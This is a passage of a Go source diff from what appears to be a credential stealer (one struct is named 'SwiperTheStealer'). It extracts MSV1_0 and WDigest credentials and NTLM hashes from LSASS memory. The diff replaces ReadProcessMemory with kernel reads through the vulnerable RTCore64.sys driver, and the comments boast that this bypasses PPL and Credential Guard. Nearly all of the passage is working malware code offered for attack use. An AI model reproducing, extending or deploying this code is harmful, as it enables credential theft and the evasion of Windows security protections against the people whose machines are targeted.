 			var creds KIWI_MSV1_0_CREDENTIALS
 			creds = *(*KIWI_MSV1_0_CREDENTIALS)(unsafe.Pointer(&credData[0]))
-			
+
 			// Extract primary credentials
 			if creds.PrimaryCredentials != 0 {
 				primaryData, err := mpce.readVirtualMemory(creds.PrimaryCredentials, 256)
@@ -988,35 +1077,25 @@ func (mpce *MultiPackageCredentialExtractor) extractCredentialsFromMSV1Session(s
 					}
 				}
 			}
-			
+
 			credPtr = creds.Next
 		}
 	}
-	
+
 	return credentials, nil
 }
 
-// readVirtualMemory - POINT 8: Read virtual memory directly using ReadProcessMemory
+// readVirtualMemory - POINT 8: Read virtual memory directly using RTCore64 kernel driver
+// THIS IS THE WHOLE POINT OF BYOVD - WE BYPASS OpenProcess/ReadProcessMemory RESTRICTIONS!
 func (mpce *MultiPackageCredentialExtractor) readVirtualMemory(address uint64, size uint32) ([]byte, error) {
-	buffer := make([]byte, size)
-	var bytesRead uintptr
-	
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
-	
-	ret, _, err := readProcessMemory.Call(
-		uintptr(mpce.lsassHandle),
-		uintptr(address),
-		uintptr(unsafe.Pointer(&buffer[0])),
-		uintptr(size),
-		uintptr(unsafe.Pointer(&bytesRead)),
-	)
-	
-	if ret == 0 {
-		return nil, fmt.Errorf("ReadProcessMemory failed: %v", err)
+	// Use RTCore64.sys to read memory from kernel space - NO PROCESS HANDLE NEEDED!
+	// This bypasses all userland protections (PPL, Credential Guard, etc.)
+	data, err := mpce.rtcore.ReadPhysicalMemory(address, size)
+	if err != nil {
+		return nil, fmt.Errorf("RTCore ReadPhysicalMemory failed at 0x%X: %v", address, err)
 	}
-	
-	return buffer[:bytesRead], nil
+
+	return data, nil
 }
 
 func (mpce *MultiPackageCredentialExtractor) readVirtualUnicodeString(us *UNICODE_STRING) (string, error) {
@@ -1031,7 +1110,7 @@ func (mpce *MultiPackageCredentialExtractor) readVirtualUnicodeString(us *UNICOD
 
 	// Decrypt if needed
 	decryptedData, _ := mpce.decryptor.LsaUnprotectMemory(data)
-	
+
 	// Convert UTF-16LE to string
 	if len(decryptedData)%2 != 0 {
 		return "", fmt.Errorf("invalid unicode string length")
@@ -1049,7 +1128,7 @@ func (mpce *MultiPackageCredentialExtractor) readVirtualUnicodeString(us *UNICOD
 		}
 		result += string(rune(r))
 	}
-	
+
 	return result, nil
 }
 
@@ -1058,12 +1137,12 @@ func (mpce *MultiPackageCredentialExtractor) bytesToUnicodeString(data []byte) s
 	if len(data)%2 != 0 {
 		return ""
 	}
-	
+
 	utf16Data := make([]uint16, len(data)/2)
 	for i := 0; i < len(utf16Data); i++ {
 		utf16Data[i] = uint16(data[i*2]) | (uint16(data[i*2+1]) << 8)
 	}
-	
+
 	result := ""
 	for _, r := range utf16Data {
 		if r == 0 {
@@ -1073,7 +1152,7 @@ func (mpce *MultiPackageCredentialExtractor) bytesToUnicodeString(data []byte) s
 			result += string(rune(r))
 		}
 	}
-	
+
 	return result
 }
 
@@ -1092,7 +1171,7 @@ func (mpce *MultiPackageCredentialExtractor) isValidNTLMHash(hash []byte) bool {
 	if len(hash) != 16 {
 		return false
 	}
-	
+
 	// Check for all zeros or all 0xFF
 	allZeros, allFFs := true, true
 	for _, b := range hash {
@@ -1103,7 +1182,7 @@ func (mpce *MultiPackageCredentialExtractor) isValidNTLMHash(hash []byte) bool {
 			allFFs = false
 		}
 	}
-	
+
 	return !allZeros && !allFFs
 }
 
@@ -1212,7 +1291,7 @@ func (sts *SwiperTheStealer) parseStruct(data []byte, v interface{}) error {
 	if len(data) < size {
 		return fmt.Errorf("data length %d is less than struct size %d", len(data), size)
 	}
-	
+
 	// This is unsafe and depends on struct layout. A better way is to use binary.Read.
 	// For the sake of keeping it simple as in the original code.
 	switch val := v.(type) {
@@ -1284,7 +1363,7 @@ func (sts *SwiperTheStealer) decrypt3DES(encryptedData []byte, key []byte, iv []
 // InitializeDecryptionKeys finds and extracts the decryption keys from LSASS memory
 func (sts *SwiperTheStealer) InitializeDecryptionKeys() error {
 	sts.logger.Info("Initializing WDigest decryption keys...")
-	
+
 	offsetExtractor := byovd.NewLsassOffsetExtractor(sts.rtcore, sts.logger)
 	keys, err := offsetExtractor.FindWDigestDecryptionKeys()
 	if err != nil {
